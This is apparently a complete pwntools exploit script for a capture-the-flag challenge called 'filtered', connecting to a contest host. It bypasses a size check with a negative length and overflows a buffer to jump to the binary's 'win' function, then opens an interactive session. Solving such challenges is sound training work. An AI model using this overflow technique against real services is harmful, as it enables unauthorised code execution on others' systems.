from pwn import *

context.binary = elf = ELF('./filtered')

#s = remote('localhost', 10000)
s = remote('filtered.chal.acsc.asia', 9001)

payload = b'A' * 280
payload += p64(elf.symbols.win)

print('ok')
s.sendlineafter('Size: ', str(-288))
s.sendlineafter('Data: ', payload)

s.interactive()
